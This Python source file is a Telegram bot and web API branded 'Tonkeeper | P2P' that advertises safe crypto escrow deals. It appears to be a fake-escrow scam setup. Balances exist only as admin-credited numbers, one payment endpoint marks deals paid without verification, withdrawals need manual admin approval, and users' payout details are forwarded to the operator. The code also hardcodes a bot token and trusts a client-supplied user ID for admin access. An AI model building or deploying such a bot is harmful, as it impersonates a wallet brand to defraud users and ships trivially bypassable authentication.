import asyncio
import json
import os
import uuid
from datetime import datetime
from typing import Dict

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiogram.client.default import DefaultBotProperties
from aiohttp import web

# ============================================================
# 1. КОНФИГУРАЦИЯ
# ============================================================
BOT_TOKEN = "8973397612:AAGcMMe1r2DyZTziExnSVyjagdXm7fptrF8"
MASTER_ADMIN_ID = 8855434638
SUPPORT_LINK = "@p2psupbot"
BOT_USERNAME = "tonkeeperp2p_bot"
BOT_NAME = " Tonkeeper | P2P"
CHANNEL_LINK = "https://t.me/tonkeeper_news"
MINI_APP_URL = "https://saitminiapp.onrender.com"

# ============================================================
# 2. ИНИЦИАЛИЗАЦИЯ
# ============================================================
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# ============================================================
# 3. ФАЙЛЫ (ТОЛЬКО ДЛЯ ЛОГОВ)
# ============================================================
FILES = {
    "deals": "deals.json",
    "balance": "balance.json",
    "withdraw": "withdraw_requests.json",
    "logs": "logs.json",
    "user_language": "user_language.json"
}

def load_json(file):
    if os.path.exists(file):
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

deals = load_json(FILES["deals"])
balance = load_json(FILES["balance"])
withdraw_requests = load_json(FILES["withdraw"])
logs = load_json(FILES["logs"])
user_language = load_json(FILES["user_language"])

# ============================================================
# 4. ПОМОЩНИКИ
# ============================================================
def is_admin(user_id: int) -> bool:
    return user_id == MASTER_ADMIN_ID

def get_user_language(user_id: int) -> str:
    uid = str(user_id)
    return user_language.get(uid, "ru")

def set_user_language(user_id: int, lang: str):
    user_language[str(user_id)] = lang
    save_json(FILES["user_language"], user_language)

def add_log(action: str, data: dict):
    """Добавляет лог и отправляет админу"""
    log_id = str(uuid.uuid4())[:8]
    log_entry = {
        "id": log_id,
        "action": action,
        "data": data,
        "time": datetime.now().isoformat()
    }
    logs[log_id] = log_entry
    save_json(FILES["logs"], logs)
    
    # Отправляем админу
    asyncio.create_task(send_log_to_admin(log_entry))

async def send_log_to_admin(log_entry: dict):
    """Отправляет лог админу в Telegram"""
    try:
        text = f"📋 <b>ЛОГ #{log_entry['id']}</b>\n\n"
        text += f"🕐 Время: {log_entry['time'][:19]}\n"
        text += f"📌 Действие: {log_entry['action']}\n"
        text += f"📊 Данные:\n"
        for key, value in log_entry['data'].items():
            text += f"   • {key}: {value}\n"
        
        await bot.send_message(MASTER_ADMIN_ID, text[:4000])
    except Exception as e:
        print(f"Ошибка отправки лога: {e}")

# ============================================================
# 5. КЛАВИАТУРЫ (ТОЛЬКО МЕНЮ)
# ============================================================
def main_menu_keyboard(user_id: int):
    buttons = [
        [InlineKeyboardButton(text="📖 Как создать сделку", callback_data="how_to_deal")],
        [InlineKeyboardButton(text="📢 Канал", callback_data="menu_channel")],
        [InlineKeyboardButton(text="🆘 Поддержка", callback_data="menu_support")],
        [InlineKeyboardButton(text="🌐 Сменить язык", callback_data="select_language")],
        [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def language_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="set_lang_ru")],
        [InlineKeyboardButton(text="🇬🇧 English", callback_data="set_lang_en")],
        [InlineKeyboardButton(text="🇨🇳 中文", callback_data="set_lang_zh")],
        [InlineKeyboardButton(text="🇸🇦 العربية", callback_data="set_lang_ar")]
    ])

# ============================================================
# 6. ОБРАБОТЧИКИ БОТА
# ============================================================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    # Проверяем, не перешли ли по ссылке сделки
    if message.text and message.text.startswith("/start deal_"):
        deal_id = message.text.split("_")[1]
        await handle_deal_link(message, deal_id)
        return
    
    uid = str(message.from_user.id)
    if uid not in user_language:
        await message.answer(
            "🌐 Выберите язык / Choose language",
            reply_markup=language_keyboard()
        )
        return
    
    lang = get_user_language(message.from_user.id)
    
    await message.answer(
        f"🔥 <b>{BOT_NAME}</b> 🔥\n\n"
        "Безопасные P2P сделки с криптовалютой.\n\n"
        "📌 Все сделки проводятся в <b>Mini App</b>\n"
        "📌 Бот только для уведомлений и поддержки\n\n"
        f"📢 Канал: {CHANNEL_LINK}\n"
        f"🆘 Поддержка: {SUPPORT_LINK}\n\n"
        "👇 Выберите действие:",
        reply_markup=main_menu_keyboard(message.from_user.id)
    )

@dp.callback_query(lambda c: c.data.startswith("set_lang_"))
async def set_language(callback: types.CallbackQuery):
    lang = callback.data.split("_")[2]
    set_user_language(callback.from_user.id, lang)
    await callback.answer("✅ Язык установлен")
    await callback.message.edit_text(
        f"🔥 <b>{BOT_NAME}</b> 🔥\n\n"
        "Безопасные P2P сделки с криптовалютой.\n\n"
        "📌 Все сделки проводятся в <b>Mini App</b>\n"
        "📌 Бот только для уведомлений и поддержки\n\n"
        "👇 Выберите действие:",
        reply_markup=main_menu_keyboard(callback.from_user.id)
    )

@dp.callback_query(lambda c: c.data == "select_language")
async def select_language(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "🌐 Выберите язык / Choose language",
        reply_markup=language_keyboard()
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_channel")
async def menu_channel(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    await callback.message.edit_text(
        f"📢 <b>Наш канал</b>\n\n"
        f"{CHANNEL_LINK}\n\n"
        "В канале:\n"
        "• Новости и обновления\n"
        "• Полезные гайды\n"
        "• Розыгрыши и бонусы\n"
        "• Актуальные курсы валют",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
        ])
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_support")
async def menu_support(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    await callback.message.edit_text(
        f"🆘 <b>Поддержка</b>\n\n"
        f"{SUPPORT_LINK}\n\n"
        "📢 Наш канал: " + CHANNEL_LINK,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
        ])
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "how_to_deal")
async def how_to_deal(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    await callback.message.edit_text(
        f"📖 <b>Как создать сделку</b>\n\n"
        "1️⃣ Нажмите <b>«Создать сделку»</b>\n"
        "   в Mini App\n\n"
        "2️⃣ Заполните форму:\n"
        "   • Название товара\n"
        "   • Валюту (TON/STARS/RUB/UAH)\n"
        "   • Сумму\n"
        "   • Username покупателя\n\n"
        "3️⃣ Отправьте ссылку покупателю\n\n"
        "4️⃣ Покупатель переходит по ссылке\n"
        "   и оплачивает на сайте\n\n"
        "5️⃣ После оплаты продавец нажимает\n"
        "   <b>«Передал товар»</b>\n\n"
        "6️⃣ Покупатель нажимает\n"
        "   <b>«Подтвердить получение»</b>\n\n"
        "7️⃣ Сделка завершена ✅\n"
        "   Деньги зачислены на баланс\n\n"
        "🔥 <b>ВАЖНО:</b>\n"
        "• Продавец НЕ МОЖЕТ подтвердить получение\n"
        "• Только покупатель завершает сделку\n"
        "• Все деньги на балансе продавца",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
        ])
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    await callback.message.edit_text(
        f"🔥 <b>{BOT_NAME}</b> 🔥\n\n"
        "Безопасные P2P сделки с криптовалютой.\n\n"
        "📌 Все сделки проводятся в <b>Mini App</b>\n"
        "📌 Бот только для уведомлений и поддержки\n\n"
        "👇 Выберите действие:",
        reply_markup=main_menu_keyboard(callback.from_user.id)
    )
    await callback.answer()

# ============================================================
# 7. ОБРАБОТКА ССЫЛКИ НА СДЕЛКУ (ОТКРЫВАЕТ MINI APP)
# ============================================================
async def handle_deal_link(message: types.Message, deal_id: str):
    if deal_id not in deals:
        await message.answer("❌ Сделка не найдена")
        return

    deal = deals[deal_id]
    if deal["status"] != "waiting_payment" and deal["status"] != "paid":
        await message.answer("❌ Сделка уже завершена")
        return

    # Проверяем, что это покупатель
    if message.from_user.username and message.from_user.username.lower() != deal["buyer_username"].lower():
        await message.answer(
            f"❌ Доступ запрещён!\n\nЭта сделка для @{deal['buyer_username']}"
        )
        return

    # Обновляем buyer_id
    deal["buyer_id"] = message.from_user.id
    save_json(FILES["deals"], deals)

    # Лог
    add_log("deal_link_opened", {
        "deal_id": deal_id,
        "buyer": message.from_user.username,
        "seller": deal["seller_username"]
    })

    # Отправляем ссылку на Mini App
    await message.answer(
        f"✈️ <b>Сделка #{deal_id}</b>\n\n"
        f"📦 Товар: {deal['product']}\n"
        f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
        f"👤 Продавец: @{deal['seller_username']}\n\n"
        f"🔥 Перейдите в Mini App для оплаты:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=f"{MINI_APP_URL}?deal={deal_id}"))],
            [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
        ])
    )

# ============================================================
# 8. API ДЛЯ MINI APP (ЛОГИ + ДАННЫЕ)
# ============================================================
async def handle_api(request):
    headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, X-Telegram-User-Id, X-Telegram-Username'
    }
    if request.method == 'OPTIONS':
        return web.Response(headers=headers)
    
    try:
        data = await request.json()
    except:
        data = {}
    
    user_id = data.get('user_id')
    endpoint = request.path
    
    # ===== БАЛАНС =====
    if endpoint == '/api/balance':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        uid = str(user_id)
        if uid not in balance:
            balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
            save_json(FILES["balance"], balance)
        return web.json_response({'success': True, 'balance': balance[uid]}, headers=headers)
    
    # ===== ПОПОЛНИТЬ БАЛАНС (АДМИН) =====
    elif endpoint == '/api/add_balance':
        target_user_id = data.get('target_user_id')
        currency = data.get('currency')
        amount = data.get('amount')
        
        if user_id != MASTER_ADMIN_ID:
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        if not all([target_user_id, currency, amount]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        uid = str(target_user_id)
        curr = currency.lower()
        if uid not in balance:
            balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        balance[uid][curr] = balance[uid].get(curr, 0) + float(amount)
        save_json(FILES["balance"], balance)
        
        add_log("admin_add_balance", {
            "admin": user_id,
            "target": target_user_id,
            "amount": amount,
            "currency": currency
        })
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== СОЗДАНИЕ СДЕЛКИ =====
    elif endpoint == '/api/create_deal':
        product = data.get('product')
        currency = data.get('currency')
        amount = data.get('amount')
        buyer_username = data.get('buyer_username')
        username = data.get('username', str(user_id))
        
        if not all([user_id, product, currency, amount, buyer_username]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        deal_id = str(uuid.uuid4())[:8]
        deals[deal_id] = {
            "deal_id": deal_id,
            "seller_id": user_id,
            "seller_username": username,
            "buyer_username": buyer_username.lower(),
            "buyer_id": None,
            "product": product,
            "currency": currency,
            "amount": float(amount),
            "status": "waiting_payment",
            "created_at": datetime.now().isoformat(),
            "paid_by_admin": None,
            "completed_at": None
        }
        save_json(FILES["deals"], deals)
        
        link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
        
        add_log("deal_created", {
            "deal_id": deal_id,
            "seller": username,
            "buyer": buyer_username,
            "amount": amount,
            "currency": currency,
            "product": product
        })
        
        return web.json_response({
            'success': True,
            'deal_id': deal_id,
            'link': link
        }, headers=headers)
    
    # ===== СДЕЛКИ ПОЛЬЗОВАТЕЛЯ =====
    elif endpoint == '/api/deals':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        user_deals = []
        for d_id, d in deals.items():
            if d.get('seller_id') == user_id or d.get('buyer_id') == user_id:
                d_copy = d.copy()
                d_copy['deal_id'] = d_id
                user_deals.append(d_copy)
        return web.json_response({'success': True, 'deals': user_deals}, headers=headers)
    
    # ===== ОПЛАТА С БАЛАНСА =====
    elif endpoint == '/api/pay_balance':
        deal_id = data.get('deal_id')
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        deal = deals[deal_id]
        if deal["status"] != "waiting_payment":
            return web.json_response({'success': False, 'error': 'Already processed'}, headers=headers)
        
        # Проверяем баланс
        uid = str(user_id)
        curr_key = deal["currency"].lower()
        if uid not in balance:
            balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        if balance[uid].get(curr_key, 0) < deal["amount"]:
            return web.json_response({'success': False, 'error': 'Insufficient balance'}, headers=headers)
        
        # Списываем
        balance[uid][curr_key] -= deal["amount"]
        save_json(FILES["balance"], balance)
        
        deal["status"] = "paid"
        deal["paid_by_admin"] = user_id
        save_json(FILES["deals"], deals)
        
        add_log("deal_paid", {
            "deal_id": deal_id,
            "buyer": user_id,
            "amount": deal["amount"],
            "currency": deal["currency"],
            "seller": deal["seller_username"]
        })
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ОПЛАТА ПО РЕКВИЗИТАМ =====
    elif endpoint == '/api/confirm_rekvisits_payment':
        deal_id = data.get('deal_id')
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        deal = deals[deal_id]
        if deal["status"] != "waiting_payment":
            return web.json_response({'success': False, 'error': 'Already processed'}, headers=headers)
        
        deal["status"] = "paid"
        deal["paid_by_admin"] = user_id
        save_json(FILES["deals"], deals)
        
        add_log("deal_paid_by_rekvisits", {
            "deal_id": deal_id,
            "buyer": user_id,
            "amount": deal["amount"],
            "currency": deal["currency"],
            "seller": deal["seller_username"]
        })
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР =====
    elif endpoint == '/api/seller_delivered':
        deal_id = data.get('deal_id')
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        deal = deals[deal_id]
        if deal["status"] != "paid":
            return web.json_response({'success': False, 'error': 'Not paid'}, headers=headers)
        
        deal["status"] = "awaiting_confirmation"
        save_json(FILES["deals"], deals)
        
        add_log("seller_delivered", {
            "deal_id": deal_id,
            "seller": deal["seller_username"],
            "buyer": deal["buyer_username"]
        })
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ПОКУПАТЕЛЬ ПОДТВЕРДИЛ ПОЛУЧЕНИЕ =====
    elif endpoint == '/api/buyer_confirm':
        deal_id = data.get('deal_id')
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        deal = deals[deal_id]
        if deal["status"] != "awaiting_confirmation":
            return web.json_response({'success': False, 'error': 'Wrong status'}, headers=headers)
        
        # Зачисляем продавцу
        seller_uid = str(deal["seller_id"])
        curr_key = deal["currency"].lower()
        if seller_uid not in balance:
            balance[seller_uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        balance[seller_uid][curr_key] = balance[seller_uid].get(curr_key, 0) + deal["amount"]
        
        # Обновляем партнёров
        buyer = deal["buyer_username"]
        if buyer not in balance[seller_uid]["deal_partners"]:
            balance[seller_uid]["deal_partners"][buyer] = 0
        balance[seller_uid]["deal_partners"][buyer] += 1
        save_json(FILES["balance"], balance)
        
        deal["status"] = "completed"
        deal["completed_at"] = datetime.now().isoformat()
        save_json(FILES["deals"], deals)
        
        add_log("deal_completed", {
            "deal_id": deal_id,
            "seller": deal["seller_username"],
            "buyer": deal["buyer_username"],
            "amount": deal["amount"],
            "currency": deal["currency"]
        })
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ВЫВОД СРЕДСТВ =====
    elif endpoint == '/api/withdraw':
        currency = data.get('currency')
        details = data.get('details')
        
        if not all([user_id, currency, details]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        uid = str(user_id)
        curr_key = currency.lower()
        if uid not in balance:
            balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        if balance[uid].get(curr_key, 0) <= 0:
            return web.json_response({'success': False, 'error': 'Insufficient balance'}, headers=headers)
        
        request_id = str(uuid.uuid4())[:8]
        withdraw_requests[request_id] = {
            "id": request_id,
            "user_id": user_id,
            "username": str(user_id),
            "currency": currency,
            "amount": balance[uid][curr_key],
            "details": details,
            "status": "pending",
            "created_at": datetime.now().isoformat()
        }
        save_json(FILES["withdraw"], withdraw_requests)
        
        add_log("withdraw_request", {
            "user_id": user_id,
            "amount": balance[uid][curr_key],
            "currency": currency,
            "details": details
        })
        
        return web.json_response({'success': True, 'request_id': request_id}, headers=headers)
    
    # ===== ПРОВЕРКА 2 СДЕЛОК =====
    elif endpoint == '/api/has_2_deals':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        uid = str(user_id)
        if uid not in balance:
            balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        partners = balance[uid].get("deal_partners", {})
        has = any(count >= 2 for count in partners.values())
        return web.json_response({'success': True, 'has_2_deals': has}, headers=headers)
    
    # ===== ПРОВЕРКА АДМИНА =====
    elif endpoint == '/api/is_admin':
        return web.json_response({'success': True, 'is_admin': user_id == MASTER_ADMIN_ID}, headers=headers)
    
    # ===== ВСЕ СДЕЛКИ (АДМИН) =====
    elif endpoint == '/api/all_deals':
        if user_id != MASTER_ADMIN_ID:
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        deals_list = []
        for d_id, d in deals.items():
            d_copy = d.copy()
            d_copy['deal_id'] = d_id
            deals_list.append(d_copy)
        return web.json_response({'success': True, 'deals': deals_list}, headers=headers)
    
    # ===== ЗАЯВКИ НА ВЫВОД (АДМИН) =====
    elif endpoint == '/api/withdraw_requests':
        if user_id != MASTER_ADMIN_ID:
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        pending = [r for r in withdraw_requests.values() if r.get('status') == 'pending']
        return web.json_response({'success': True, 'requests': pending}, headers=headers)
    
    # ===== ПОДТВЕРДИТЬ ВЫВОД (АДМИН) =====
    elif endpoint == '/api/confirm_withdraw':
        request_id = data.get('request_id')
        if user_id != MASTER_ADMIN_ID:
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        if request_id not in withdraw_requests:
            return web.json_response({'success': False, 'error': 'Request not found'}, headers=headers)
        
        req = withdraw_requests[request_id]
        if req.get('status') != 'pending':
            return web.json_response({'success': False, 'error': 'Already processed'}, headers=headers)
        
        uid = str(req['user_id'])
        curr_key = req['currency'].lower()
        if uid not in balance:
            balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        if balance[uid].get(curr_key, 0) >= req['amount']:
            balance[uid][curr_key] -= req['amount']
            save_json(FILES["balance"], balance)
        
        req['status'] = 'completed'
        req['completed_at'] = datetime.now().isoformat()
        save_json(FILES["withdraw"], withdraw_requests)
        
        add_log("withdraw_confirmed", {
            "request_id": request_id,
            "user_id": req['user_id'],
            "amount": req['amount'],
            "currency": req['currency']
        })
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ОТКЛОНИТЬ ВЫВОД (АДМИН) =====
    elif endpoint == '/api/reject_withdraw':
        request_id = data.get('request_id')
        if user_id != MASTER_ADMIN_ID:
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        if request_id not in withdraw_requests:
            return web.json_response({'success': False, 'error': 'Request not found'}, headers=headers)
        
        withdraw_requests[request_id]['status'] = 'rejected'
        save_json(FILES["withdraw"], withdraw_requests)
        
        add_log("withdraw_rejected", {
            "request_id": request_id,
            "user_id": withdraw_requests[request_id]['user_id']
        })
        
        return web.json_response({'success': True}, headers=headers)
    
    return web.json_response({'success': False, 'error': 'Unknown endpoint'}, headers=headers)

# ============================================================
# 9. ЗАПУСК ВЕБ-СЕРВЕРА
# ============================================================
async def start_web_server():
    app = web.Application()
    app.router.add_route('*', '/{path:.*}', handle_api)
    port = int(os.environ.get('PORT', 3000))
    print(f"🌐 API сервер запущен на порту {port}")
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    return runner

# ============================================================
# 10. ЗАПУСК
# ============================================================
async def main():
    print("=" * 50)
    print("🔥 Tonkeeper P2P Бот (Только логи)")
    print("=" * 50)
    print(f"👑 Админ: {MASTER_ADMIN_ID}")
    print(f"🤖 Бот: @{BOT_USERNAME}")
    print(f"📱 Mini App: {MINI_APP_URL}")
    print("=" * 50)
    await start_web_server()
    print("✅ Бот готов к работе!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
